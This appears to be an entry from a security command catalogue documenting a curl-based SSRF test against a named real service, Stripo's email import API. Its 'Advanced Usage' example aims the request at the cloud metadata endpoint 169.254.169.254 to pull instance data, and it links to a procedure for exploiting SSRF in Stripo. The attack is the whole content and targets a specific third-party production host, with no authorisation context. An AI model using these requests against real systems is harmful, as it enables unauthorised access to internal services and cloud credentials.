---
data: 'curl -X GET "https://my.stripo.email/api/import?url=$URL" -v'
tags:
  - ssrf
  - web
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.389Z'
id: 81836d36-2f7c-4b59-8f67-f56678b68e0e
verified: false
validated: true
submitted: true
---
# curl-ssrf-test-stripo

## Command

```bash
curl -X GET "https://my.stripo.email/api/import?url=$URL" -v
```

## Description

This command uses curl to test for SSRF in the Stripo email service by sending a GET request with a user-supplied URL parameter, allowing verification of request forwarding to external or internal targets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `"https://my.stripo.email/api/import?url=$URL"` | Target endpoint with URL parameter; replace $URL with test/internal URL | Yes |
| `-v` | Verbose mode to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://my.stripo.email/api/import?url=http://example.com" -v
```

### Advanced Usage

```bash
curl -X GET "https://my.stripo.email/api/import?url=http://169.254.169.254/latest/meta-data/" -v --header "Authorization: Bearer token"
```

## Expected Output

Verbose curl output showing the request headers, response code (e.g., 200 OK), and body. For successful SSRF, the response may include data from the forged URL, or external logs confirm the hit.

## Related

- [[Related Procedure|procedures/Exploit-SSRF-in-Stripo-Email]]
